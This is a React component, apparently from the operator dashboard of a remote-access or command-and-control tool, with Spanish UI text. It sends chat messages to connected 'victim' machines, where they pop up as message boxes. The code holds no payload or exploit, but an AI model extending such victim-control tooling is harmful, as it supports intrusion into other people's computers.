'use client';
import { useEffect, useRef, useState } from 'react';
import { Send } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import type { Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

type ChatEvent = { id: string; kind: string; legacy: string; createdAt: string };

export function ChatPanel({ victim }: { victim: Victim }) {
  const [text, setText] = useState('');
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { data, refresh } = useApi<{ items: ChatEvent[] }>(`/victims/${victim.id}/chat`);
  const live = useLiveContext();
  const last = live.events[0];
  const end = useRef<HTMLDivElement>(null);

  useEffect(() => { if (last?.type === 'task.update') refresh(); }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps
  useEffect(() => { end.current?.scrollIntoView({ block: 'end' }); }, [data?.items.length]);

  async function send(event: React.FormEvent) {
    event.preventDefault();
    if (!text.trim() || busy) return;
    setBusy(true);
    setError(null);
    try {
      const result = await mutate<{ delivered: boolean }>(`/victims/${victim.id}/chat`, 'POST', { text: text.trim() });
      setText('');
      if (!result.delivered) setError('Guardado en el hilo, pero el socket está caído: el message box se entregará al reconectar.');
      refresh();
    } catch (caught) {
      setError(caught instanceof Error ? caught.message : 'no se pudo enviar');
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex h-[360px] flex-col">
      <div className="flex-1 space-y-2 overflow-y-auto p-3">
        {(data?.items ?? []).length === 0 ? (
          <p className="py-8 text-center text-xs text-muted">Sin mensajes. El texto se muestra en el equipo con un message box y queda en el hilo y en el log.</p>
        ) : null}
        {(data?.items ?? []).map((item) => (
          <div key={item.id} className={item.kind === 'chat_in' ? 'flex justify-start' : 'flex justify-end'}>
            <div className={`max-w-[80%] rounded-md border px-2 py-1 text-xs ${item.kind === 'chat_in' ? 'border-line bg-panel' : 'border-brand/30 bg-brand/10'}`}>
              <p className="whitespace-pre-wrap break-words">{item.legacy}</p>
              <p className="mt-0.5 text-right font-mono text-2xs text-muted/60">{new Date(item.createdAt).toLocaleTimeString('es-ES', { hour12: false })}</p>
            </div>
          </div>
        ))}
        <div ref={end} />
      </div>
      {error ? <p className="border-t border-warn/30 bg-warn/10 px-3 py-1 text-2xs text-warn">{error}</p> : null}
      <form onSubmit={send} className="flex items-center gap-2 border-t border-line p-2">
        <Input value={text} onChange={(event) => setText(event.target.value)} maxLength={1000} placeholder="Mensaje para el operador del equipo…" />
        <Badge tone={victim.socket ? 'ok' : 'warn'}>{victim.socket ? 'socket' : 'offline'}</Badge>
        <Button size="sm" type="submit" loading={busy} disabled={!text.trim() || busy}><Send className="h-3 w-3" /> enviar</Button>
      </form>
    </div>
  );
}
